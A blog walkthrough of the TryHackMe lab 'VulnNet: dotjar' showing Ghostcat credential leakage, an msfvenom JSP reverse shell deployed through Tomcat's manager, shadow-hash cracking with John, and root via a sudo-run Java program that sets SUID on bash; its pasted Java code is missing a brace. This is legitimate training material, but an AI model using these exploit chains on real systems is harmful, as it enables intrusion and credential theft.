---
title: "Walk-through of VulnNet: dotjar from TryHackMe"
header:
  teaser: /assets/images/2021-04-27-21-20-46.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Linux
  - Ghostcat
  - MSFVenom
  - JohnTheRipper
  - Unshadow
---

## Machine Information

![dotjar](/assets/images/2021-04-29-17-28-00.png)

VulnNet: dotjar is a medium difficulty room on TryHackMe. An initial scan reveals just two ports, with an outdated version of Apache and AJP running on them. We use the Ghostcat exploit to gain a foothold, and from our reverse shell we find a backup of the password shadow file. We crack a users password then abuse sudo permissions to execute a malicious java program we compile on the server, finally gaining root.

<!--more-->

Skills required are basic enumeration and file manipulation. Skills learned are writing and compiling a Java based exploit.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Medium - VulnNet: dotjar](https://tryhackme.com/room/vulnnetdotjar) |
| Machine Release Date | 31st January 2021 |
| Date I Completed It | 29th April 2021 |
| Distribution Used | Kali 2021.1 – [Release Info](https://www.kali.org/blog/kali-linux-2021-1-release) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/thm/dotjar]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.33.74 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/thm/dotjar]
└─# nmap -p$ports -sC -sV -oA dotjar 10.10.33.74

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 15:26 BST
Nmap scan report for 10.10.33.74
Host is up (0.032s latency).

PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.16 seconds
```

First let's add the IP to our hosts file:

```text
┌──(root💀kali)-[~/thm/jellyfish]
└─# echo 10.10.33.74 dotjar.thm >> /etc/hosts
```

Now let's have a look at the website on port 8080:

![dotjar-default](/assets/images/2021-04-28-15-41-42.png)

We find a basic install of Apache Tomcat on version 9.0.30. We can see [here](http://tomcat.apache.org/oldnews-2019.html) that this is from 2019, and a Google for an exploit finds [this](https://apkash8.medium.com/hunting-and-exploiting-apache-ghostcat-b7446ef83e74). Ghostcat is a well known exploit, and one I've covered before in [this](https://pencer.io/ctf/ctf-thm-tomghost/) room.

Back to this server, and I can't find easy access via the website. Default credentials aren't working for the Manager App and Host Manager areas:

![dotjar-login](/assets/images/2021-04-28-15-46-31.png)

## Ghostcat Exploit

Last time I used ajpshooter, this time I'll turn to searchsploit, so let's see what we've got:

```text
┌──(root💀kali)-[~/thm/dotjar]
└─# searchsploit tomcat ajp  
---------------------------------------------------------------- ---------------------------------
 Exploit Title                                                  |  Path
---------------------------------------------------------------- ---------------------------------
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion               | multiple/webapps/48143.py
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit) | multiple/webapps/49039.rb
---------------------------------------------------------------- ---------------------------------
```

Let's grab the python script:

```text
┌──(root💀kali)-[~/thm/dotjar]
└─# searchsploit -m 48143.py
  Exploit: Apache Tomcat - AJP 'Ghostcat File Read/Inclusion
      URL: https://www.exploit-db.com/exploits/48143
     Path: /usr/share/exploitdb/exploits/multiple/webapps/48143.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /root/thm/dotjar/48143.py
```

Reading through the script it looks like we just give it the target server IP or name:

```text
┌──(root💀kali)-[~/thm/dotjar]
└─# python 48143.py dotjar.thm
Getting resource at ajp13://dotjar.thm:8009/asdf
----------------------------
<SNIP>
  <display-name>VulnNet Entertainment</display-name>
  <description>
     VulnNet Dev Regulations - mandatory
1. Every VulnNet Entertainment dev is obligated to follow the rules described herein according to the contract you signed.
2. Every web application you develop and its source code stays here and is not subject to unauthorized self-publication.
-- Your work will be reviewed by our web experts and depending on the results and the company needs a process of implementation might start.
-- Your project scope is written in the contract.
3. Developer access is granted with the credentials provided below:
 
    webdev:<HIDDEN>
 
GUI access is disabled for security reasons.
 
4. All further instructions are delivered to your business mail address.
5. If you have any additional questions contact our staff help branch.
  </description>
</web-app>
```

The username and password lets us get in to the Host Manager and Server Status areas:

![dotjar-manager](/assets/images/2021-04-28-16-46-34.png)

It doesn't work for the Manager App though, the reason is shown above in the exploit output:

```text
GUI access is disabled for security reasons.
```

## MSFVenom

Now we have credentials to Apache we can upload a Java based reverse shell. Let's create one using msfvenom:

```text
┌──(root💀kali)-[~/thm/dotjar]
└─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.8.165.116 LPORT=1234 -f war -o pencer-shell.war
Payload size: 1083 bytes
Final size of war file: 1083 bytes
Saved as: pencer-shell.war
```

Another Google found [this](https://gist.github.com/pete911/6111816) which shows how to use curl to upload the file. Let's try it:

```text
┌──(root💀kali)-[~/thm/dotjar]
└─# curl --upload-file pencer-shell.war -u webdev:'<HIDDEN>' 'http://dotjar.thm:8080/manager/text/deploy?path=/' 
OK - Deployed application at context path [/pencer-shell.war]
```

Now we can trigger the reverse shell, either by browsing to it:

![dotjar-warfile](/assets/images/2021-04-28-17-14-11.png)

Or using curl, for that we need to open the actual .jsp file inside that war:

```text
┌──(root💀kali)-[~/thm/dotjar]
└─# jar tf pencer-shell.war 
WEB-INF/
WEB-INF/web.xml
rvptpjsbxcgx.jsp

┌──(root💀kali)-[~/thm/dotjar]
└─# curl http://dotjar.thm:8080/pencer-shell2.war/rvptpjsbxcgx.jsp
```

Either way, switching to our waiting netcat listeners sees we have a connection:

```text
┌──(root💀kali)-[~/thm/dotjar]
└─# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.8.165.116] from (UNKNOWN) [10.10.33.74] 36432
```

## Reverse Shell

First thing as always is upgrade to a better shell:

```text
python3 -c 'import pty;pty.spawn("/bin/bash")'
web@vulnnet-dotjar:/$ ^Z
zsh: suspended  nc -nlvp 1234
┌──(root💀kali)-[~/thm/dotjar]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 1234
web@vulnnet-dotjar:/$ stty rows 52 cols 237
```

I had a look around, other than finding another user called jdk-admin there wasn't anything obvious. Time to try LinPEAS and see if we can find anything. Get the latest version and start a web server on Kali so we can get to it:

```text
┌──(root💀kali)-[~/thm/dotjar]
└─# wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
--2021-04-28 21:20:55--  https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 332111 (324K) [text/plain]
Saving to: ‘linpeas.sh’
linpeas.sh                 100%[===========================================================>] 324.33K  --.-KB/s    in 0.05s   
2021-04-28 21:20:55 (5.81 MB/s) - ‘linpeas.sh’ saved [332111/332111]

┌──(root💀kali)-[~/thm/dotjar]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now back on the server we can pull the file over and run it:

```text
web@vulnnet-dotjar:/dev/shm$ wget http://10.8.165.116/linpeas.sh
--2021-04-28 22:08:43--  http://10.8.165.116/linpeas.sh
Connecting to 10.8.165.116:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 325018 (317K) [text/x-sh]
Saving to: ‘linpeas.sh’
linpeas.sh        100%[==============>] 317.40K  1.44MB/s    in 0.2s    
2021-04-28 22:08:43 (1.44 MB/s) - ‘linpeas.sh’ saved [325018/325018]

web@vulnnet-dotjar:/dev/shm$ chmod +x linpeas.sh 
web@vulnnet-dotjar:/dev/shm$ ./linpeas.sh
```

It takes a long time to run, but eventually we find something interesting from the output:

```text
[+] Backup files
-rw-r--r-- 1 root root 485 Jan 16 13:44 /var/backups/shadow-backup-alt.gz
```

What is this then?

## John The Ripper

Let's check it out:

```text
web@vulnnet-dotjar:/dev/shm$ file /var/backups/shadow-backup-alt.gz
/var/backups/shadow-backup-alt.gz: gzip compressed data, was "shadow", last modified: Sat Jan 16 12:44:11 2021, from Unix

web@vulnnet-dotjar:/dev/shm$ cp /var/backups/shadow-backup-alt.gz .
web@vulnnet-dotjar:/dev/shm$ gunzip shadow-backup-alt.gz 
web@vulnnet-dotjar:/dev/shm$ file shadow-backup-alt 
shadow-backup-alt: ASCII text

web@vulnnet-dotjar:/dev/shm$ cat shadow-backup-alt 
root:<HIDDEN>:18643:0:99999:7:::
jdk-admin:<HIDDEN>:18643:0:99999:7:::
web:<HIDDEN>:18643:0:99999:7:::
```

We have a copy of the shadow file containing the hashes of the users passwords. We can use unshadow to combine it with the /etc/passwd file:

```text
──(root💀kali)-[~/thm/dotjar]
└─# unshadow 
Usage: unshadow PASSWORD-FILE SHADOW-FILE

┌──(root💀kali)-[~/thm/dotjar]
└─# unshadow passwd.txt shadow.txt 
root:<HIDDEN>
jdk-admin:<HIDDEN>:1000:1000:jdk-admin,,,:/home/jdk-admin:/bin/bash
web:<HIDDEN>:1001:1001:,,,:/home/web:/bin/bash
```

We can save these hashes to a file then use JohnTheRipper to try and crack them:

```text
┌──(root💀kali)-[~/thm/dotjar]
└─# john hashes.txt --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<HIDDEN>       (jdk-admin)
1g 0:00:00:00 DONE (2021-04-29 21:51) 9.090g/s 2327p/s 2327c/s 2327C/s i<3ruby..diana
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## Privilege Escalation

We find the password for user jdk-admin, let's switch to them and grab the first flag:

```text
web@vulnnet-dotjar:/dev/shm$ su jdk-admin
Password: 

jdk-admin@vulnnet-dotjar:/dev/shm$ cat /home/jdk-admin/user.txt 
THM{<HIDDEN>}
```

One of the first things I check after a getting access to a new user is sudo rights:

```text
jdk-admin@vulnnet-dotjar:/dev/shm$ sudo -l
Matching Defaults entries for jdk-admin on vulnnet-dotjar:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jdk-admin may run the following commands on vulnnet-dotjar:
    (root) /usr/bin/java -jar *.jar
```

## Java Exploit

Excellent, our jdk-user can run any java file as root. A search found a java program that alters the permissions on bash. Nice and simple let's paste it straight in to the server:

```text
jdk-admin@vulnnet-dotjar:/dev/shm$ cat <<EOF >>root.java 
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;

public class root {
    public static void main(String[] args) {
        String command = "chmod +s /bin/bash";
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            reader.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
EOF
```

Now we need to compile it:

```text
jdk-admin@vulnnet-dotjar:/dev/shm$ javac root.java
jdk-admin@vulnnet-dotjar:/dev/shm$ jar cfe root.jar root root.class
```

Then we can run our code to change bash permissions:

```text
jdk-admin@vulnnet-dotjar:/dev/shm$ sudo -u root /usr/bin/java -jar root.jar
```

## Root Flag

Finally we run bash and escalate to root to get the last flag:

```text
jdk-admin@vulnnet-dotjar:/dev/shm$ bash -p
bash-4.4# cat /root/root.txt
THM{<HUDDEN>}
```

All done. See you next time.
